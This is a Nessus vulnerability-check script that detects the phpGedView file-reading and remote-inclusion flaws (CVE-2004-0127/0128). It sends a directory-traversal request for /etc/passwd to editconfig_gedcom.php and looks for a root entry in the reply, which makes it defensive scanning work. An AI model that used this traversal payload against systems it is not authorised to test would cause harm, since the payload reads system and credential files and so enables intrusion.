#
# (C) Tenable Network Security
#


include("compat.inc");

if(description)
{
 script_id(12034);
 script_cve_id("CVE-2004-0127", "CVE-2004-0128");
 script_bugtraq_id(9529, 9531);
 script_xref(name:"OSVDB", value:"3768");
 script_xref(name:"OSVDB", value:"3769");
 script_version ("$Revision: 1.14 $");
 
 name["english"] = "phpGedView arbitrary file reading";
 script_name(english:name["english"]);
 
 script_set_attribute(attribute:"synopsis", value:
"A remote web application is vulnerable to several flaws." );
 script_set_attribute(attribute:"description", value:
"The remote host is running phpGedView - a set of CGIs written in PHP 
designed to do web-based genealogy.

There is a bug in this software which may allow an attacker to read 
arbitary files on the remote web server with the privileges of the web
user. Another bug may also allow an attacker to include arbitrary PHP
files hosted on a third-party web site." );
 script_set_attribute(attribute:"solution", value:
"Upgrade to the latest version of phpGedView or disable this software." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );


script_end_attributes();

 script_summary(english: "Checks Aprox Portal");
 script_category(ACT_GATHER_INFO);
 script_copyright(english:"This script is Copyright (C) 2004-2009 Tenable Network Security");
 script_family(english:"CGI abuses");
 script_dependencie("webmirror.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);


if(!can_host_php(port:port))exit(0);

foreach dir (cgi_dirs())
{
 u = strcat(dir,"/editconfig_gedcom.php?gedcom_config=../../../../../../../../../../etc/passwd");
 r = http_send_recv3(method: "GET", item: u, port:port);
 if (isnull(r)) exit(0);
 buf = strcat(r[0], r[1], '\r\n', r[2]);
 if(egrep(pattern:"root:.*:0:[01]:", string:buf)){
 	security_hole(port);
	exit(0);
	}
}
